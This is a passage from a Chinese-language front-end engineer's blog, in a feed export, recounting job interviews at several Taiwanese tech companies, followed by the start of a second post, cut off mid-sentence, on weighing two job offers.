href="#結果" class="headerlink" title="結果"></a>結果</h4><p>一面時發現不適合，所以沒有後續。</p><h3 id="Hahow"><a href="#Hahow" class="headerlink" title="Hahow"></a>Hahow</h3><p>產品：線上課程平台<br>管道：主動投遞外加朋友內推<br>面試方式：Google Meet</p><p>原本 Hahow 其實沒有開前端工程師的缺，只開了一個 Tech Lead，雖然我覺得自己經歷不太符合，但跟朋友討論一下還是決定先投再說，投了以後 Hahow 的 co-founder 之一先來找我聊聊天。</p><h4 id="零面：co-founder"><a href="#零面：co-founder" class="headerlink" title="零面：co-founder"></a>零面：co-founder</h4><p>會說是零面是因為這不是正式的面試，比較像是單純的聊聊天，主要一樣聊我這次求職的目標以及這個職位要做的事情，也介紹了 Hahow 最近在做的事以及內部的組織架構，主要分成 2B 跟 2C 兩個團隊，大概都四個工程師，前後端各兩個。</p><p>也介紹了 Tech Lead 這個缺，開缺是因為前一個 Tech Lead 離職所以要補人，希望能找到比較有管理經驗的人，聽一聽之後我自己覺得能力還沒到所以就說希望能改面前端工程師。</p><h4 id="結果-1"><a href="#結果-1" class="headerlink" title="結果"></a>結果</h4><p>過幾天之後 Hahow 有來邀請面試，但我那時候已經決定 offer 了，就沒有繼續面了。</p><h3 id="Shopline"><a href="#Shopline" class="headerlink" title="Shopline"></a>Shopline</h3><p>產品：開店平台<br>管道：HR 主動聯絡<br>面試方式：Zoom</p><p>其實 HR 已經是大概兩三個月前聯絡的，剛好在翻訊息才看到，就回訊息問了還有沒有開缺，發現還有就開始面試。</p><h4 id="一面：技術面"><a href="#一面：技術面" class="headerlink" title="一面：技術面"></a>一面：技術面</h4><p>有兩個面試官，都是工程師，一開始搭配 codesandbox 外加螢幕分享來考程式實作，題目不難，一共有三題：</p><ol><li>fizz buzz</li><li>求出兩個陣列的差集</li><li>費氏數列</li></ol><p>第一題看到題目就知道想問什麼了，畢竟很經典。我習慣先寫一個至少答案對的版本，再來想一下之後怎麼改進，於是就寫了一個 %15 的，寫完以後被問了一個不錯的問題：「如果你是 code review 的 reviewer，你會對自己這段 code 有什麼評價？」，自己的程式碼自己鞭。</p><p>第二題沒什麼難度，用 indexOf 判斷一下就好，主要是想考內建函式熟悉程度，真的忘記也可以直接開 MDN 來看。</p><p>第三題給了一個迴圈解，然後被問了遞迴解的時間複雜度，腦袋當機的我居然猜了 O(n!)，真滴丟臉。這一題算是討論的比較久，因為原本寫的方法有一些小問題，就有讓我再重寫了別的版本試試看，邊寫邊討論有哪邊可以再做改進。</p><p>我覺得這種面試方法還滿不錯的，用一些簡單的小題目一來可以刷掉底子很差的工程師，二來也可以直接看到面試者怎麼 coding 還有 coding style，有什麼問題也可以即時地去討論。</p><p>考這個大概花了半小到一小，接下來就是針對過往的經歷來問，例如說有問到：</p><ol><li>之前做過的專案</li><li>之前碰過的效能優化的地方</li><li>如何衡量效能優化是否有效</li><li>如何評估導入一項新技術</li><li>React + Redux 使用上碰過的困難之處</li><li>Redux 使用心得</li><li>如何選擇 CSS framework</li></ol><p>問完之後就換我問他們問題，我這次主要都是好奇技術團隊的人數跟架構，他說台灣這邊工程師好像 40 幾個，7 個前端，但不是前端一個 team，而是分成幾個不同的 scrum team，team 裡面有前端有後端有 PM 之類的。</p><p>最後問了面試流程，說這關過了跟 HR 簡單聊一下，聊完跟技術主管，接著最後一關是 CEO。</p><h4 id="結果-2"><a href="#結果-2" class="headerlink" title="結果"></a>結果</h4><p>之後有寄信來邀約二面，二面的面試官是 Engineering Director，但已經答應其他 offer 所以取消，沒有繼續面試。</p><h3 id="財報狗"><a href="#財報狗" class="headerlink" title="財報狗"></a>財報狗</h3><p>產品：投資理財網站<br>管道：主動投遞<br>面試方式：Zoom</p><p>財報狗雖然薪資上界是我的下界，但我相當喜歡他們開放透明的風格，在<a href="https://github.com/f2etw/jobs/issues/608">徵才頁面</a>上把許多東西都講得很清楚，例如說面試流程、優缺點以及公司文化跟風格，這一點很吸引我，所以還是投了，想說可以聊聊看。</p><h4 id="一面：CEO"><a href="#一面：CEO" class="headerlink" title="一面：CEO"></a>一面：CEO</h4><p>一面基本上就是跟 CEO 聊聊天，幾乎沒什麼在聊技術，我問他們的問題是：</p><ol><li>公司組織架構（公司幾個人、技術團隊幾個人）</li><li>技術細節（前後端用的技術、伺服器在哪裡、有沒有寫測試跟 CI&#x2F;CD）</li></ol><p>目前公司 6 個人而已，工程師有 4 個人，團隊規模比我想像中的還小，以公司型態來說就是很早期的新創，不過公司營收是可以完全支撐團隊的，這點我覺得滿厲害。</p><p>對方問我的問題有：</p><ol><li>從去年離職之後到今年都在幹嘛</li><li>個人目標是什麼？</li><li>有沒有什麼公司的特性是我絕對不會想去的？</li></ol><p>對方聽你回答完或者是問完問題之後，都會幫你總結一遍確認溝通無誤，這個溝通方式滿好的！因為有些問題我回答完自己都想說：「我在供三小」，結果對方總結之後會覺得「對就是這樣，我就是想說這個」，滿佩服對方整理跟歸納的能力。</p><p>有時候藉由對方總結，也可以幫自己整理一下思緒。例如說個人目標那一題，我談到教學跟出國旅遊，對方就很疑惑公司怎麼幫助我達成個人目標。</p><p>我就解釋說我把公司跟個人目標切開，這兩者對我來說是完全獨立的，在工作上我只求個人成長，增加技術跟管理相關的能力，跟我個人想做的事情完全沒有關係。</p><p>對方就幫我總結說：「所以看起來你的目標有分兩種，一種是職涯上的目標，另外一種是工作之外的目標，是嗎？」，我就說：「對欸對欸就是這樣」，這樣分的話就很清楚了。</p><h4 id="二面：技術面"><a href="#二面：技術面" class="headerlink" title="二面：技術面"></a>二面：技術面</h4><p>面試官是一面的 CEO 跟另外一位全端工程師，這次聊的都是技術，問題大概如下：</p><ol><li>寫 code 時會注意什麼（我回答：coding style 用 prettier + eslint 解、把常用 function 抽出、奇怪的地方加註解）</li><li>有聽過 clean code 跟 SOLID 嗎？（我回答：有但印象不太深刻，然後講了一下自己的理解，後來對方提示 SOLID 代表的東西，我就比較有印象了，然後舉例回答）</li><li>design pattern 有用過嗎？（我回答：前端很常出現觀察者模式（event listener 跟 react-redux），但自己唯一用過的是工廠模式）</li><li>測試（我回答：以前寫過 unit test 跟一點 e2e testing）</li><li>引入新框架的考量點跟優先順序（我回答：第一是功能，能不能做出我們所想要的，第二是生態系，是不是夠多人用有夠強的社群，第三是難易度，學習曲線影響了新人跟之後找人，然後會做個 POC 簡單驗證一下）</li><li>CI&#x2F;CD 經驗（我回答：工作上用過，自己之前有串過拿來改作業）</li></ol><p>輪到我發問的時間，我問了這些問題：</p><ol><li>前端架構長怎麼樣</li><li>git 協作上的 workflow</li><li>碰過的效能問題（這題後來有被反問，我的回答很長就先省略了）</li><li>財報狗的測試</li><li>財報狗的後端架構（回答這個問題直接開圖出來介紹，加分）</li></ol><p>他們前端新的頁面是用 Vue，後端是 Ruby on Rails。</p><p>面試起來的感覺滿不錯的，對方一樣會總結你剛剛的回答，確保彼此溝通無誤，對於有些答不出來的部分，對方也會講一下他的理解，有種教學相長的感覺。例如說 SOLID 那一題，專有名詞忘記也沒關係，概念有講到就好，後來也有幫我補充專有名詞喚醒我的回憶，講得比較奇怪的地方也會跟你討論。</p><p>面試時間差不多兩個小時。</p><h4 id="結果-3"><a href="#結果-3" class="headerlink" title="結果"></a>結果</h4><p>最後因為已經答應了其他 offer 所以婉拒了三面。但這一次面試下來，感覺最好的絕對是財報狗，沒有之一，真心祝他們能早日找到適合的人選。</p><h3 id="浪-Live"><a href="#浪-Live" class="headerlink" title="浪 Live"></a>浪 Live</h3><p>產品：直播網站<br>管道：HR 主動聯繫<br>面試方式：到公司面試</p><p>猜測跟我之前做過直播平台的背景有關所以在 Linkedin 上面被找去面試，雖然之前做完直播以後就對直播沒太大興趣，但還是想說去聊聊看，順便交流一下直播會碰到的問題。公司在中山國中站附近，那邊整個辦公室都是工程師，還有另一個辦公室在內湖。</p><h4 id="一面-Round1：技術面"><a href="#一面-Round1：技術面" class="headerlink" title="一面 Round1：技術面"></a>一面 Round1：技術面</h4><p>被帶進會議室之後要先填寫個人資料還有一個小考卷，話說以前年輕不懂事，那種個人資料表都會全部填，後來發現很多沒填也沒差，所以我通常只填姓名、電話還有信箱，其他隨意。</p><p>考題的部分就是 JS 常見面試題，就不多談了，然後有些陷阱題滿有趣的。</p><p>寫完之後面試官進來，是兩個工程師，主要就是談一下之前的工作經歷，做了哪些東西，總之就是聊天的感覺，交換一些技術上的意見，有特別討論了一下 redux-saga 跟 redux-observable 使用上的差異還有心得。</p><p>聊得差不多之後（大概一小時）就到下一輪。</p><h4 id="一面-Round2：技術副總"><a href="#一面-Round2：技術副總" class="headerlink" title="一面 Round2：技術副總"></a>一面 Round2：技術副總</h4><p>一開始一樣是聊技術，問一些技術相關的問題，相關背景問完之後開始問三個情境題，我覺得都滿有趣的。</p><h4 id="第一題"><a href="#第一題" class="headerlink" title="第一題"></a>第一題</h4><p>直播送禮物的時候都會在前端顯示訊息，今天如果同時有 1000 個人都送了禮物，而小明是第 1000 個人，那前端應該怎麼顯示訊息？因為如果正常排隊的話，假設一個訊息 1 秒，小明也要等 1000 秒，有沒有什麼解法？</p><h4 id="第二題"><a href="#第二題" class="headerlink" title="第二題"></a>第二題</h4><p>假設今天有一個很舊的 API 只能用 GET 來傳帳號密碼做登入，我們想要盡量保護使用者的資料，應該要怎麼做比較好？</p><h4 id="第三題"><a href="#第三題" class="headerlink" title="第三題"></a>第三題</h4><p>假設今天網站有一個購物車的功能，我們想節省後端的資源，讓前端來做這件事，需要在同一個瀏覽器底下的分頁之間共享購物車，可以怎麼做？</p><p>除了第一題沒答出來以外，二三題都被說回答得滿好的，第二題說是他面試半年以來答的最完整的，可能是我除了回答加密或是 hash 以外，還明確地指岀應該用哪一種演算法吧？而且之前寫了跟 Cookie 以及 Session 有關的文章其實幫了不少，有些概念是互通的。</p><p>技術部份聊完以後就是發問時間，對方花了滿長時間在介紹他們公司的方向還有最近要做的事，講得很完整。在技術部門方面他們工程師滿多人的，前端好像四個，後端八個，還有 Android 與 iOS 工程師。原本進辦公室想說好像有點小，後來才知道原來我看到的都是工程師，那這樣其實挺大的（至少跟我以前待的新創比起來）</p><p>聊得差不多以後就先出去了，然後我留在會議室用電話跟 HR 再進行下一輪。</p><h4 id="一面-Round3：HR"><a href="#一面-Round3：HR" class="headerlink" title="一面 Round3：HR"></a>一面 Round3：HR</h4><p>因為疫情的關係所以 HR 那天是在家工作，就一樣問了工作經歷相關的東西，還有每個人資都會問的求職相關問題，然後介紹了一下公司福利。</p><p>前兩輪已經面了大概兩個半小時，精神已經有點恍惚了，所以沒想到什麼問題要問 HR 的，因此面的滿快就結束了。</p><p>一個工作天以後被邀請二面。</p><h4 id="二面-Round1：資深技術副總"><a href="#二面-Round1：資深技術副總" class="headerlink" title="二面 Round1：資深技術副總"></a>二面 Round1：資深技術副總</h4><p>技術方片沒有前面聊得那麼仔細，比較像是聊一些大方向的東西，還有聊之前的工作內容，工作內容聊完以後問了一些個人背景相關的問題，像是：</p><ol><li>為什麼念哲學系？</li><li>那為什麼會接觸程式？</li><li>有修資工系的課嗎？</li><li>當初怎麼去新加坡的？</li><li>為什麼從新加坡離開？</li><li>從新加坡離開之後在幹嘛？</li><li>為什麼出來求職？</li><li>這次想找的公司型態為何？</li></ol><p>以上問題也是這次面試任何公司時幾乎都會碰到的常見問題。在反問時間的時候我問了公司有沒有碰到什麼效能上的問題，他回了一個手機上碰過的實際案例。</p><p>聊了大概一個小時，終於到了最後一輪。</p><h4 id="二面-Round2：人資主管"><a href="#二面-Round2：人資主管" class="headerlink" title="二面 Round2：人資主管"></a>二面 Round2：人資主管</h4><p>是公司的超早期員工，應該是第二個或第三個之類的，她說之前面試碰到的兩個技術副總都是她找進來的。</p><p>問的問題一樣圍繞個人背景跟職涯發展，有問到說他們公司對我的吸引力是什麼？我就很老實給一個答案，說浪跟其他公司對我來說都差不多，就是普普通通，從以前到現在唯一讓我心動過的就只有 <a href="/2017/10/21/stripe-and-i-df35a6f0a799/">Stripe</a>。</p><p>在聊到過往的工作經歷時，也主動跟對方提說之前每份工作都只待一年半左右，但我不擔心這個，因為時間雖然不長，但我有做到該做的事，對公司也帶來很多效益，能留多久是看緣分跟契合程度的事，沒辦法勉強，但只要待了就會把事情做好。</p><h4 id="結果-4"><a href="#結果-4" class="headerlink" title="結果"></a>結果</h4><p>有打來問意願，但沒有直接發 offer，直接告知已經答應其他 offer 了。面起來的感覺都不錯，特別喜歡情境題那一關，題目出得不錯，比一堆常見萬年考古題有趣多了。</p><h3 id="優訊-Unistar"><a href="#優訊-Unistar" class="headerlink" title="優訊 Unistar"></a>優訊 Unistar</h3><p>產品：博弈業<br>管道：獵人頭<br>面試方式：到公司面試</p><p>在內湖的博弈業，以前都沒面過博弈業，想說也可以去聊聊看，看能不能聊出什麼心得，如果價格開得夠高，也不排斥去博弈業看看，畢竟博弈業應該也有很多技術上的挑戰。</p><p>進去以後一樣先寫個人資料還有考卷，考題分成三個部分：</p><ol><li>JS，結合 this、scope 跟 event loop 的題目，出得滿好的</li><li>CSS，要你水平垂直置中一個 float 元素，然後要你畫出 box model，以及寫出常用的 CSS3 屬性</li><li>React，給你一個 UI 設計稿問你會怎麼設計這個元件，然後問 key 的作用還有 state 與 props 的差別</li></ol><p>題目難度普通，雖然有些我寫不出來就是了。</p><h4 id="Round1：技術面"><a href="#Round1：技術面" class="headerlink" title="Round1：技術面"></a>Round1：技術面</h4><p>一樣問了很多常見問題，這邊我就不再講一次了。比較印象深刻的題目有：</p><ol><li>redux 概念可以稍微講一下嗎？</li><li>controlled component 跟 uncontrolled component 熟悉嗎？</li><li>redux middleware 可以再講深一點嗎？</li></ol><p>進去之後做的事情基本上是重構，把舊的 Ember 的 code 翻新成 React，預計要花一些時間，感覺滿有挑戰性的。</p><h4 id="Round2：技術主管"><a href="#Round2：技術主管" class="headerlink" title="Round2：技術主管"></a>Round2：技術主管</h4><p>重新自我介紹了一遍，然後問的東西還記得的差不多是這樣：</p><ol><li>HTTP&#x2F;2 知道嗎？講一下你的理解</li><li>CDN 知道嗎？講一下你的理解</li><li>keep alive 在幹嘛？</li></ol><p>其他問題基本上也是從工作經歷去問，沒有特別記下來問了什麼。</p><h4 id="Round3：大主管"><a href="#Round3：大主管" class="headerlink" title="Round3：大主管"></a>Round3：大主管</h4><p>又自我介紹了一遍，這面試官跟前兩個截然不同，不怎麼講話，看起來比較嚴肅。</p><p>後來談到我之前在新加坡工作，然後他問了比較細的問題，例如說公司在哪裏，我那時候就想說他是不是在新加坡工作過，後來他說他是新加坡人（但我真的聽不出來，可能離開太久）</p><p>在技術方面大概問了一下怎麼維持 code quality，一開始我就說 code review，後來他說這已經是寫完 code 以後了，那之前呢？我就稍微補充一下 prettier 跟 eslint 一些工具的使用。</p><p>其餘的一樣問了前面那些問題，就是人資型的問題，像是那種什麼生涯規劃、選公司考量還有期望待遇之類的。</p><h4 id="結果-5"><a href="#結果-5" class="headerlink" title="結果"></a>結果</h4><p>在還沒有下文之前就已經答應別的公司的 offer，所以也不知道結果為何。</p><h3 id="Shopback"><a href="#Shopback" class="headerlink" title="Shopback"></a>Shopback</h3><p>產品：電商網站<br>管道：獵人頭<br>面試方式：Skype</p><p>應該滿多人用過這個服務的，就是買東西可以拿回饋，這間其實之前在新加坡就有聽過，有朋友跟同事都是從這間出來的。職缺的話是 full-stack，雖然我是走前端但是要我做後端也不排斥啦，所以一樣投。</p><h4 id="一面：HR-1"><a href="#一面：HR-1" class="headerlink" title="一面：HR"></a>一面：HR</h4><p>針對工作經歷問一些問題，例如說：</p><ol><li>上一份工作的工作內容是什麼？</li><li>使用者人數有多少？</li><li>為什麼離開上一份工作？</li></ol><p>還有針對這次求職問一些問題：</p><ol><li>面試狀況（已經到哪個階段，剛開始還是正在面）</li><li>喜歡的公司型態</li><li>如果都拿到 offer，會怎麼選擇？</li></ol><p>接著我問對方的問題是：</p><ol><li>工程師的工作內容</li><li>工程團隊之間的溝通</li><li>公司福利（假期、研討會補助）</li><li>之後的面試流程</li></ol><p>接下來會有作業，做完之後有過就 on-site，先技術面（白板題），面完之後跟人資談。</p><h4 id="結果-6"><a href="#結果-6" class="headerlink" title="結果"></a>結果</h4><p>已經答應其他 offer，婉拒後續面試。話說作業還滿有趣的，是做那種常見元件的 component（例如說做一個 dropdown 或是做一個 modal 的元件之類的）。</p><h3 id="OneDegree"><a href="#OneDegree" class="headerlink" title="OneDegree"></a>OneDegree</h3><p>產品：網路保險<br>管道：Cakeresume 主動投遞 + Linkedin 聯繫<br>面試方式：到公司面試</p><p>在批踢踢很常看到徵才文（雖然有些負評就是了），從一開始就有注意了，發現還在招人之後就透過 Cakeresume 投遞，後來收到一個內部成員的信件說想邀請面試，在 Linkedin 上也被台灣負責人問說要不要面試，後來成功與 HR 在 Linkedin 上取得聯絡，開始面試。</p><h4 id="Round1：技術面-1"><a href="#Round1：技術面-1" class="headerlink" title="Round1：技術面"></a>Round1：技術面</h4><p>進會議室以後有一共三個工程師，另一個面試官（主管）在曼谷，所以直接遠端連線進來，開始以後就問說：你英文如何？ 我就回了：普通，然後主管就請我用英文自我介紹，接著就是突然其來的英文面試了。</p><p>自我介紹我主要是講前兩份工作的內容，然後他會再從那裡面去問問題，例如問說之前碰過最難的挑戰是什麼，還有之前有沒有處理過資安相關的問題，以及效能上的優化等等。</p><p>我自己覺得答的滿爛的，英文真的要練習，不然就只能像我這樣丟人現眼，哭哭。幸好問一問之後他說：「那現在可以切成中文了」，我才鬆一口氣。</p><p>接著是現場其他面試官的提問，有問了 functional css 使用上的感想還有 SSR 的經驗，這次面試下來發現 SSR 幾乎是 React 的必考題，有實作過的話應該還滿加分的，也問了一些其他的像是 TechBridge 之類的的問題，技術上的問題我覺得並沒有問到很多。</p><h4 id="Round2"><a href="#Round2" class="headerlink" title="Round2"></a>Round2</h4><p>問完技術問題以後面試官就先出去了，接著有三個人進來：台灣負責人、當初傳訊息給我的工程師還有 HR，接下來聊的都跟技術無關了，純粹是介紹公司還有聊聊這次求職的期待。</p><p>總之聊的時候覺得滿聊得來的，氣氛都不錯，就有種朋友間聊天那種感覺，最後聊到期望待遇，然後很有誠意的直接現場發 offer。</p><h4 id="結果-7"><a href="#結果-7" class="headerlink" title="結果"></a>結果</h4><p>思考了一個週末以後決定去這間，結束面試之旅。為什麼最後選這間，可以參考：<a href="/2020/04/26/i-dont-know-what-i-want-about-career-383bee0be733/">關於求職，連我自己都不知道我要什麼</a>。</p><h3 id="面試總結"><a href="#面試總結" class="headerlink" title="面試總結"></a>面試總結</h3><p>這次因為受到疫情影響，根據獵人頭的說法，有滿多公司都把缺關起來了，不過職缺的數目我覺得還是 OK 的。比較值得注意的一件事情是有些獵人頭的缺在 104 上面也有，但薪水寫面議，所以你看了也不會知道有到我期望的這個範圍。</p><p>然後大部分面試都會以 Zoom 線上面試為主，到辦公室的比較少一點，應該跟疫情滿有關係，因為有些公司我搜心得的時候大多都是直接到現場去面試。</p><p>關於技術方面的考題，可能是因為要找比較資深的，所以幾乎沒有筆試了，就算有對方通常也不會看，可能預設你都回答得出來。問的問題主要圍繞在以前的工作經歷中做過的東西，常見問題像是：</p><ol><li>介紹以前工作上做了什麼</li><li>以前碰過什麼困難的技術問題？</li><li>有做過什麼效能優化嗎？</li><li>有寫過測試嗎？</li><li>與其他團隊成員還有設計跟 PM 的溝通方式為何？</li></ol><p>以 React 來說，常見問題是：</p><ol><li>有做過 Server-side rendering 嗎？</li><li>有用過 redux 跟 middleware 嗎？</li><li>用什麼方式管理 Style？例如說 Styled component？</li></ol><p>在問題的回答上會比較在意的是要有自己的看法，舉例來說，我就回答了不少次 redux-saga 跟 redux-observable 的差異還有使用心得，之前在 Modern Web 2018 有講過這個主題，所以特別熟悉。</p><p>實戰上的經驗也很重要，Server-side rendering 幾乎每間公司都有問，我在前兩份工作都有實作到，也有不少東西可以講。</p><p>回答的深度跟完整性也可以加分，例如說效能優化很常考， 可以從特定框架（例如說 React 或是 Vue，雖然 React 不是框架）的角度來回答，也可以從減少 HTTP request 以及降低 bundle size 的角度來回答，講更細的話可以講到減少 CSS 大小、減少 JS 大小（dynamic import 與 code splitting 等等）還有減少圖片（像是 webp 或是 lazy loading）。</p><p>如果你對這方面的優化很有興趣但工作上卻碰不到，可以試試看我與學生合作的專案：<a href="https://github.com/Lidemy/lazy-hackathon">新拖延運動黑客松</a>，雖然說能做的有限，但也不失是一個練習的機會。</p><p>喔對了，這次面試沒有碰到任何演算法相關題目或者是白板題。</p><p>再來是這次面試有一個優點也是缺點，那就是知名度。因為有在經營 <a href="http://weekly.techbridge.cc/">TechBridge Weekly</a> 還有<a href="https://blog.huli.tw/">技術部落格</a>，去面試的時候有些面試官第一句話就是：「我有看過你的文章」，或是「我有在看 TechBridge」，一方面很開心在做的東西有人看，另一方面也是感到有點壓力。</p><p>為什麼有壓力？怕對方幻想破滅啊！看文章覺得哇這個人好像不錯，結果找來面試被看破手腳，怎麼這個也不會，那個也不會，哭哭。我都已經想好會不會哪天在靠北工程師看到自己出現在上面：「有沒有某個常寫部落格的工程師，卻連 XXX 都不懂的八卦」。</p><p>然後這次被問的個人相關的問題，最常見的絕對是：</p><ol><li>為什麼去新加坡？為什麼又離開？</li><li>離職後這一年在幹嘛？</li><li>為什麼念哲學系？怎麼沒唸資工系？</li></ol><p>一些個人背景相關的問題（為什麼念哲學系、怎麼沒唸資工、有修了哪些資工系的課、什麼原因開始學程式），從找第一份工作的時候就一直被問了，沒想到工作了四年以後還是會被問一次，不枉費我還特別<a href="/2017/10/05/the-programming-journey-1-b9b19c0ef05b/">寫文章</a>來解釋這段故事。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>其實一開始是抱持著：「我要面好多間，分享好多心得」還有「我要成為 offer 收割機，拿一堆 offer」的心態去面試，面一面發現這樣子很沒有意義，為什麼要拿一堆 offer？是想用來證明自己的價值嗎？可是為什麼需要透過這樣證明自己的能力？拿 offer 有時候本來就是看緣分的事情，有些就是跟公司文化不合或是技術不符，沒有拿到不是誰的錯，拿到了也不代表什麼。</p><p>所以這次找到自己覺得不錯的缺，思考幾天之後就答應了，後續的面試也都全部推掉，畢竟再面試下去意義也不大。從開始對外求職一直到求職結束，其實也就兩個禮拜的事情而已，比第一次求職的時候順利許多，心態上也很不一樣。有關最後怎麼選擇工作還有其他心得，可以參考：<a href="/2020/04/26/i-dont-know-what-i-want-about-career-383bee0be733/">關於求職，連我自己都不知道我要什麼</a>。</p><p>五年前第一次求職，大部分時候都像是在被考試，而這次可能是因為經驗變多了，比較像是技術上的交流，交換一下對某個問題的意見，比起考試更像是同事之間的討論。反正知道什麼我就把經驗分享出來，不知道的就說不知道。</p><p>這次使用 Linkedin 求職，有不少不認識的網友們私訊推薦職缺，私訊中已經有先感謝了，在這邊再公開感謝一遍，也順便幫這些公司曝光一下，應該都還在徵人：</p><ol><li>幣安</li><li>Grindr</li><li>台灣人工智慧學校</li><li>17 直播</li><li>Omlet Arcade</li><li>Verizon Media</li></ol><p>大概就是這樣啦，大約兩週以後要開始上班了，希望一切順利！</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>關於求職，連我自己都不知道我要什麼</title>
      <link href="/2020/04/26/i-dont-know-what-i-want-about-career-383bee0be733/"/>
      <url>/2020/04/26/i-dont-know-what-i-want-about-career-383bee0be733/</url>
      
        <content type="html"><![CDATA[<p>簡單記一下這次求職時的一些心得。</p><p>在求職的時候，有一些問題很常被問到，像是：</p><ol><li>你這次求職想看一些什麼類型的公司？</li><li>你的職涯規劃是什麼？</li><li>你在工作上的目標是什麼？</li></ol><p>有些問題我以為我知道答案，但沒有，我不知道。</p><p>舉例來說，一開始我都說這次求職沒有特定喜好，想要到處看看，所以公司類型都可以。想要到處看看是真的，但是都可以是真的嗎？這次也看了博奕業，但如果拿到 offer，我真的會去嗎？可能不會。如果公司很遠在南港，我會去嗎？也可能不會。</p><p>一開始也看了滿多小公司，直到真的面試之後才發現，小公司我真的 ok 嗎？還是我這次其實想要找比較大一點的公司？我不知道。</p><p>沒有限制是一種自由，但也是一種困擾。</p><p>你想找什麼職位？資深前端工程師？好啊。那如果有 team leader 的位置呢？好啊，也可以試試看。那如果是全端呢？好啊，我也不排斥。到處看看是好事，問題是最後要怎麼做選擇。因為最後能選的只有一個，沒有什麼我全都要這種事，很多工作條件是互斥的，不相容就是不相容。</p><p>小公司有小公司的好處，人少，但是自由度高，而且有機會可以跟同事們一起創造出公司文化，有種一起打拼的感覺，但缺點就是人少，比如說像我以前待的 team，只有我一個前端，碰到問題根本沒人可以討論。有人可能會說：「阿公司這麼大，你可以去找其他 team 的前端啊」，但是我想找的是平常工作上就會交流的同事，討論機會可以更頻繁。</p><p>團隊成員比較多的公司也有好處，就像我上面提到的一樣，有機會可以互相討論，就算不討論好了，也有機會可以看到其他人寫的 code，至少有人一起做同樣的事，不會從頭到尾都在單打獨鬥。但相對應的缺點可能就是自由度比較低，而且人一多就會有人的問題，而不只是程式的問題。</p><p>繼續往前端走也有好處，可以繼續精進自己的前端技能；往管理職走也很不錯，但在技術上進步的幅度就少很多，主要精進的是一些軟性技能；或是往全端走，增進對後端的了解，提升技術廣度。</p><p>進去一個技術要由舊換新的團隊，可能要同時維護兩個框架，然後慢慢從 A 框架移到 B 框架，雖然聽起來很麻煩，但如果順利完成，就像吃了經驗加倍卡一樣，經驗值暴增，而且同時熟悉兩套框架。若是進去一個技術很現代的團隊，可以學習到最新的技術，熟悉最新的工具，而且沒有舊的程式碼的包袱，也是很不錯的一件事。</p><p>做直播？我可以把以前做直播時想做但沒做到的事試著在這份工作完成，讓平台變得更好，並且解決一些可能碰到的效能問題。做博弈？對我來說是個全新的領域，可以一窺神秘的博弈業，熟悉這個產業；做電商？業務邏輯應該滿複雜的，雖然很煩瑣，但可以學到怎麼樣處理比較複雜的需求。</p><p>這就是我碰到的困擾，因為生性樂觀，每一種我都可以找出優點給你看。</p><p>就算看起來是屎缺，我都會覺得若是我能改善環境並且克服挑戰，一樣是件很值得而且效益很高的事。或許理想是理想現實是現實，或許我改善不了，或許我太天真，不過那也沒什麼，離職就是了，我也沒什麼損失。</p><p>在這次的求職過程中，我時常想到進擊的巨人裡面的一句話：</p><blockquote><p>什麼都無法捨棄的人，什麼也改變不了。</p></blockquote><p>或是想起了之前聽到的時間管理心法：</p><blockquote><p>時間沒有管理，只有取捨</p></blockquote><p>也想到了以前學生求職時，跑來問我手上的幾個 offer 應該怎麼選擇的事，或者是批踢踢的軟體工作版的請益文。</p><p>最後勢必要做選擇沒錯，這個大家都知道，可是選擇的依據究竟是什麼？這真的是一件困難的事。而我這次得出的心得是：「就算你心中有個標準，那也不一定是真的」。因為有些東西，擺在你面前的時候你才會知道你想要它。</p><p>舉例來說，可能對很多人來說都先把博弈業拿掉，可是如果年薪比你拿到的最高的 offer 還多出 50 萬呢？這時候就說不準了。我一開始說我想在前端領域再精進，但如果有一個薪水高很多的職缺讓我做全端，我會接受嗎？搞不好也會。</p><p>我也跟獵人頭說南港太遠基本上不考慮，但如果南港那間的缺我真的很有興趣呢？那我還是很有可能會去。</p><p>這不只是錢的問題，也是標準會變動的問題，有些點你可能一開始沒有想到，想到之後你的標準也一起改變了。像是我前面講的小團隊的問題，一開始只想到大團隊在工作上的交流可能比較多，討論也比較多，但通常就是專注在工程上；可是小團隊雖然技術上的進步可能沒那麼多，但搞不好你可以管到公司的徵才流程上面，做一些自己一直很想做的改善，思考的面向就不同了。</p><p>對我來說，到每一個地方都可以成長，只是成長的速度跟面向會有所不同，而這件事是很難量化的。</p><p>這一次求職有拿到了兩個 offer，最後就是這兩個在做決定，而且這兩個的型態完全不一樣。A 是小公司小團隊，做管理職，可以往技術的廣度去走，而且自由度很高，可以把徵工程師這塊都給我管，讓我來找人，創造自己想要的徵才文化；B 的團隊大很多，做的是工程師，讓我繼續往前端這塊精進。</p><p>就跟我前面講的一樣，兩個都很好，兩個都有優缺點，選 A 就是往管理走，選 B 就是往技術走，而我是小孩子所以只能做選擇，沒辦法全都要，這兩條路是完全不同方向的選擇。</p><p>那最後我是怎麼選的？</p><p>就擲硬幣，出現人頭就去 A，出現字就去 B，最後出現字，所以就去 B 了。喔對了，在擲硬幣之前請大家先確認自己手中的硬幣是公正硬幣，才不會偏頗特定一邊。</p><p>沒有啦，雖然我確實看過有文章建議大家擲硬幣，但儘管很難選，認真想個幾天，還是可能會有答案。或者應該要這樣說，決定答案並不是一個 1 或 0 的過程，而是 0~1 之間的拉扯。</p><p>舉例來說，如果 A 代表 0，B 代表 1，起始點是 0.5（兩個都同樣想去），可能今天你想到更多 A 的優點，就變 0.3（離 A 更近），隔天發現 B 也一樣，就回到 0.5，後天覺得 B 更好，就變 0.8（離 B 更近）。</p><p>直到發生以下三種情況，才會下決定（有些人只有出現 1 的狀況才會做決定，所以才會猶豫很久）：</p><ol><li>心中的天秤數字出現 0 或是 1，某一邊大獲全勝</li><li>某一天突然決定不想了，直接根據當時的數字選擇更靠近的那邊</li><li>數字穩定傾向某一邊持續個幾天，於是決定選擇那一邊</li></ol><p>而我最後做決定，是因為出現 3 